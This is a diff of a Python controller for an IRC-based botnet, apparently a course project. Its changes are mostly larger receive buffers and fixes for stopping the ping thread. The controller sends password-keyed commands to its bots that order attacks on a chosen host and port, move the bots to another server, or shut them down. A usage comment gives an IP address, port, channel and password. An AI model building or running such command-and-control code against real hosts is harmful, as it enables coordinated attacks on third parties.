@@ -5,7 +5,7 @@ HOST = ""
 PORT = -1
 CHAN = ""
 
-BUF_SIZE = 1024
+BUF_SIZE = 4096
 
 
 username = ""
@@ -36,7 +36,7 @@ def startConn():
         #print("could not start ping thread")
 
     while 1:
-        botNum = ''.join(random.choice('0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ') for i in range(6))
+        botNum = ''.join(random.choice('0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz') for i in range(6))
         botName = "conbot-"
         botName = botName + botNum
         print("botname: " + botName)
@@ -45,7 +45,7 @@ def startConn():
         s.send(usr.encode('utf-8'))
         nick = "NICK %s \r\n" % (botName)
         s.send(nick.encode('utf-8'))
-        rec = s.recv(1024).decode("utf-8")
+        rec = s.recv(4096).decode("utf-8")
         print(rec)
         prefix, command, args = parsemsg(rec)
 
@@ -56,7 +56,7 @@ def startConn():
     print("channel: " + CHAN)
     join = "JOIN %s\r\n" % (CHAN)
     s.send(join.encode('utf-8'))
-    serverReply = s.recv(1024)
+    serverReply = s.recv(4096)
     print("Controller is running. Connected with nick: " + botName)
     while 1:
         command = input("enter command: ")
@@ -67,7 +67,7 @@ def startConn():
 
     join = "JOIN %s\r\n" % (CHAN)
     s.send(join.encode('utf-8'))
-    serverReply = s.recv(1024)
+    serverReply = s.recv(4096)
     print("Controller is running. Connected with nick: " + botName)
     while 1:
         command = input("enter command: ")
@@ -83,7 +83,7 @@ def status(s):
     print("waiting for bots to respond...")
     time.sleep(5)
     print("done sleeping")
-    recvd_lines = s.recv(1024).decode('utf-8') #this buffer size may need to change
+    recvd_lines = s.recv(4096).decode('utf-8') #this buffer size may need to change
     lines = recvd_lines.split('\n')
     for line in lines:
         if not line:
@@ -116,7 +116,7 @@ def attack(s,host,port):
     print("waiting for bots to respond...")
     time.sleep(5)
     print("done sleeping")
-    recvd_lines = s.recv(1024).decode('utf-8')  # this buffer size may need to change
+    recvd_lines = s.recv(4096).decode('utf-8')  # this buffer size may need to change
     lines = recvd_lines.split('\n')
     for line in lines:
         if not line:
@@ -142,6 +142,7 @@ def attack(s,host,port):
     print("Total: "+str(atk_s)+" successful, "+str(atk_f)+" unsuccessful")
 
 def move(s, hostname, newport, channel):
+    global running
     counter = 0
 
     movestr = "PRIVMSG %s :%s move %s %s %s\r\n" % (CHAN, secret, hostname, newport, channel)
@@ -150,7 +151,7 @@ def move(s, hostname, newport, channel):
     print("waiting for bots to respond")
     time.sleep(5)
 
-    recvd_lines = s.recv(1024).decode('utf-8')
+    recvd_lines = s.recv(4096).decode('utf-8')
     lines = recvd_lines.split('\n')
 
     for line in lines:
@@ -172,8 +173,8 @@ def move(s, hostname, newport, channel):
         counter += 1
 
     print("%d bots were moved." % (counter))
-	running = False
-	ping_thread.join()
+    running = False
+    ping_thread.join()
     s.send("QUIT\r\n".encode('utf-8'))
     s.close()
     global HOST
@@ -186,22 +187,25 @@ def move(s, hostname, newport, channel):
     startConn()
 
 def quit(s):
+    global running
     s.send(("QUIT\r\n").encode('utf-8'))
+    running=False
     s.close()
-	running = False
-	ping_thread.join()
+    running = False
+    ping_thread.join()
     sys.exit(0)
 
 def shutdown(s):
     counter=0
     shutstr= "PRIVMSG " + CHAN + " :" + secret + " shutdown\r\n"
     s.send(shutstr.encode('utf-8'))
-	running = False
+
 
     print("waiting for bots to respond")
     time.sleep(5)
 
-    recvd_lines = s.recv(1024).decode('utf-8')
+    recvd_lines = s.recv(4096).decode('utf-8')
+    print(recvd_lines)
     lines = recvd_lines.split('\n')
 
     for line in lines:
@@ -268,11 +272,13 @@ def parsecmd(c, s):
 
 def server_ping(s):
     while running:
-        time.sleep(10)
+        time.sleep(5)
         #pingmsg = "PRIVMSG %s hi\r\n" % CHAN
         #print(pingmsg)
-        s.send(pingmsg.encode('utf-8'))
-    
+        try:
+            s.send(pingmsg.encode('utf-8'))
+        except:
+            break
         
 # python conbot.py 199.116.235.44 12399 group12 pass
 if __name__ == '__main__':
